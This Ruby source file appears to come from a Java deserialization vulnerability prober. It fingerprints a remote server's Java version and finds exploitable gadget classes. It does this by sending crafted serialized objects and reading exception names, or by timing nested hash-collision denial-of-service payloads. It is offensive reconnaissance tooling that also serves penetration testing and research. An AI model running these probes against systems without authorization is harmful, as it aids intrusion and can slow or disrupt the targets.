#!/usr/bin/env ruby

require_relative 'classfile'
require_relative 'serialize'
require_relative 'payloads/probe'
require_relative 'payloads/dos'
require_relative 'util'

require 'set'

module Java
  module Prober
    class AttackVector
    end

    class ProbeContext
      attr_accessor :probes, :reg, :models, :params, :gadgets, :classes, :flags

      def initialize(probes, reg, params: [])
        @probes = probes
        @reg = reg
        @models = Set[]
        @classes = Set[]
        @gadgets = Set[]
        @flags = Set[]
        @params = params
      end

      def push(probe)
        @probes.push(probe)
      end

      def pushf(probe)
        @probes.unshift(probe)
      end

      def flag(f)
        debug 'Setting flags ' + f
        @flags.add(f)
      end

      def flag?(f)
        @flags.include?(f)
      end

      def model(model)
        @models.add(model)
      end

      def class(cls)
        @classes.add(cls)
      end

      def class?(cls)
        @classes.include?(cls)
      end

      def gadget(g)
        @gadgets.add(g)
      end

      def gadget?(g)
        @gadgets.include?(g)
      end

      def report
        @gadgets.each do |gadget|
          vuln 'Found gadget: ' + gadget
        end
      end

      def run(strategy)
        until @probes.empty?
          probe = @probes.shift
          begin
            if strategy.run(probe, self)
              debug '[+] ' + probe.to_s
            else
              debug '[-] ' + probe.to_s
            end
          rescue Exception => e
            raise
            puts '[E] ' + probe.to_s + ': ' + e.to_s
          end
        end
        !@gadgets.empty?
      end
    end

    class Probe
      attr_accessor :true, :false, :reg

      def initialize(t: nil, f: nil)
        @true = t
        @false = f
      end

      def invert
        false
      end

      def make(_strategy)
        raise
      end

      def false(ctx)
        @false.call(ctx) unless @false.nil?
      end

      def true(ctx)
        @true.call(ctx) unless @true.nil?
      end
    end

    class ExistsProbe < Probe
      def initialize(cname, t: nil, f: nil)
        super(t: t, f: f)
        @cname = cname
      end

      def make(strategy)
        strategy.make_exists(@cname)
      end

      def true(ctx)
        ctx.class(@cname)
        super
      end

      def to_s
        'Exists? ' + @cname
      end
    end

    class DeserProbe < Probe
      def initialize(cname, desc: nil, suid: 0, t: nil, f: nil, reg: nil, fields: {})
        super(t: t, f: f)

        @regular = false
        @fields = fields
        @cname = cname.tr('.', '/')

        ts = 'L' + cname.tr('.', '/') + ';'

        @reg = reg
        unless reg.nil?
          @regular = true
          return
        end

        desc = { 'hasWriteObject' => false, 'serialVersion' => suid } if desc.nil?
        desc['typeString'] = ts
        @desc = desc
      end

      def invert
        true
      end

      def make(strategy)
        if @regular
          strategy.make_deser(Java::Serialize::JavaObject.new('L' + @cname + ';', @fields))
        else
          strategy.make_deser(Java::Serialize::JavaCustomObject.new(@cname, @fields, @desc))
        end
      end

      def to_s
        'Deser ? ' + @cname.tr('/', '.')
      end
    end

    def register(probes)
      probes.each do |probe|
        BuiltinProbes.register(probe)
      end
    end
    module_function :register

    class BuiltinProbes
      @@probes = []

      def initialize
        Dir[File.dirname(__FILE__) + '/probes/*.rb'].sort.each do |file|
          require file
        end
      end

      def self.register(probe)
        @@probes.push(probe)
      end

      def create_context(reg, params: {})
        ProbeContext.new(@@probes.map(&:dup), reg, params: params)
      end
    end

    class ProbeStrategy
      @@probeModels = ['model/probe-java9.json', 'model/probe-java10.json']

      def initialize(t)
        @test = t
      end

      def init(ctx); end

      def run(_probe, _ctx)
        raise
      end
    end

    class ExceptionProbeStrategy < ProbeStrategy
      def initialize(t)
        super(t)
      end

      def init(ctx)
        pmodel = nil
        @@probeModels.each do |model|
          reg = Java::Serialize::Registry.new(base: File.dirname(__FILE__) + '/')
          reg.load('model/base-java9.json')
          reg.load(model)

          p = Java::Serialize::Payloads::Probe.make_probe_test(nil)

          r = @test.call(p, reg, ctx.params)
          next if r == 'java.io.InvalidClassException'

          pmodel = model
          break
        end

        raise 'No support for remote java version' if pmodel.nil?

        ctx.reg.load(pmodel)
      end

      def run(probe, ctx)
        obj, handler = probe.make(self)
        reg = ctx.reg
        reg = probe.reg unless probe.reg.nil?
        if !handler.nil?
          r = @test.call(obj, reg, ctx.params)
          r = handler.call(r)
        else
          r = !@test.call(obj, reg, ctx.params).nil?
        end

        if r
          probe.true(ctx)
        else
          probe.false(ctx)
        end
        r
      end

      def make_exists(cname)
        [
          Java::Serialize::Payloads::Probe.make_eventlistenerlist_probe(cname, nil, nil),
          ->(r) { r == 'java.lang.NullPointerException' }
        ]
      end

      def make_deser(obj)
        [
          Java::Serialize::JavaArray.new('Ljava/lang/Object;', [obj, Java::Serialize::JavaCustomObject.new('LDoesnotexist;', {}, 'typeString' => 'LDoesnotexist;')]),
          lambda do |r|
            return true if r == 'java.lang.ClassNotFoundException'
          end
        ]
      end
    end

    class TimingProbeStrategy < ProbeStrategy
      def initialize(t)
        super(t)
      end

      def init(ctx)
        reg = Java::Serialize::Registry.new(base: File.dirname(__FILE__) + '/')
        reg.load('model/base-java9.json')
        @thresh = 1.75
        baseline = time { @test.call('foobar', reg, []) }
        @lastt = baseline
        @testDepth = 0

        puts '[I] Trying to autodetect timing...'

        for nestDepth in 5..15
          t = time { @test.call(Java::Serialize::Payloads::DOS.make_hash_dos(2 * nestDepth), reg) }
          if t > 3 * @lastt
            @lastt = t
            @testDepth = nestDepth * 2
            break
          else
            @lastt = t
          end
        end

        puts '[I] Using DOS depth ' + @testDepth.to_s + ' baseline time ' + baseline.to_s + ' test time ' + @lastt.to_s

        pmodel = nil
        @@probeModels.each do |model|
          reg = Java::Serialize::Registry.new(base: File.dirname(__FILE__) + '/')
          reg.load('model/base-java9.json')
          reg.load(model)

          p = Java::Serialize::Payloads::Probe.make_probe_test(nil)

          t = time { @test.call(p, reg) }

          next if t < 0.4 * @lastt

          pmodel = model
          break
        end

        raise 'No support for remote java version' if pmodel.nil?

        ctx.reg.load(pmodel)
      end

      def time
        start = Time.now.to_f
        yield
        Time.now.to_f - start
      end

      def run(probe, ctx)
        obj = probe.make(self)
        reg = ctx.reg
        reg = probe.reg unless probe.reg.nil?
        t = time { @test.call(obj, reg, ctx.params) }
        if (t > @thresh * @lastt) != probe.invert
          probe.false(ctx)
          return false
        else
          probe.true(ctx)
          return true
        end
      end

      def make_exists(cname)
        Java::Serialize::Payloads::Probe.make_eventlistenerlist_probe(cname,
                                                                      Java::Serialize::Payloads::DOS.make_hash_dos(@testDepth),
                                                                      Java::Serialize::Payloads::DOS.make_hash_dos(@testDepth))
      end

      def make_deser(obj)
        Java::Serialize::JavaArray.new('Ljava/lang/Object;', [
                                         Java::Serialize::Payloads::DOS.make_hash_dos(@testDepth),
                                         obj,
                                         Java::Serialize::Payloads::DOS.make_hash_dos(@testDepth)
                                       ])
      end
    end
  end
end
